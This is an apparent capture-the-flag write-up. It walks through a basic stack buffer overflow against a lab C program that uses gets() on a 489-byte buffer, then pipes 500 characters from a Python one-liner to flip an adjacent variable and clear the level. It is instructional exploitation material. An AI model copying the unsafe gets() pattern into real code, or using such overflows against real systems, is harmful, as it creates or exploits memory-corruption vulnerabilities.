Let's take a look at the source code...

```
#include <stdio.h>
#include <stdlib.h>

int main()
{
    char buffer[489];
    int g;
    g = 0;
    gets(buffer);
    if(g)
    {
        printf("Wait aren't you supposed to be researching? Level Cleared!\n");
    }

}
```

First off, our objective is to get the program to execute the printf. Thing is, it will only execute if g isn't 0 (which it is, since that is the default value for int) becuase in C when an int is examined by an if then statement it returns true only if the int isn't equal to 0.
There is no direct way we can modify that int. However we can see that there is a bug with the gets() function. Thing about the gets function, it will allow as much input as it gets untill a null terminator or a EOF (Enf-of-File it tells the program to stop accepting input).
Currently the gets command is writing to a buffer 489 bytes. The int we need to modify is declared right after the buffer, so they should be side by side in memory. So we should need to write 490 bytes to overflow the buffer and change the value of the int, so the if then statement will evaluate as true. I will do this by using python to write 490 characters (1 character = 1 byte) and pipe it into the program.

```
guyinatuxedo@tux:/Hackery/escape/buf_ovf/b0_64$ echo `python -c 'print "1"*490'` | ./b0_64
guyinatuxedo@tux:/Hackery/escape/buf_ovf/b0_64$ 
```

So that didn't work. It is probably because there is some padding inbetween the char and the int. Let's try inputting 500 characters.

```
guyinatuxedo@tux:/Hackery/escape/buf_ovf/b0_64$ echo `python -c 'print "1"*500'` | ./b0_64
Wait aren't you supposed to be researching? Level Cleared!
```

And just like that, we pwned the buffer.

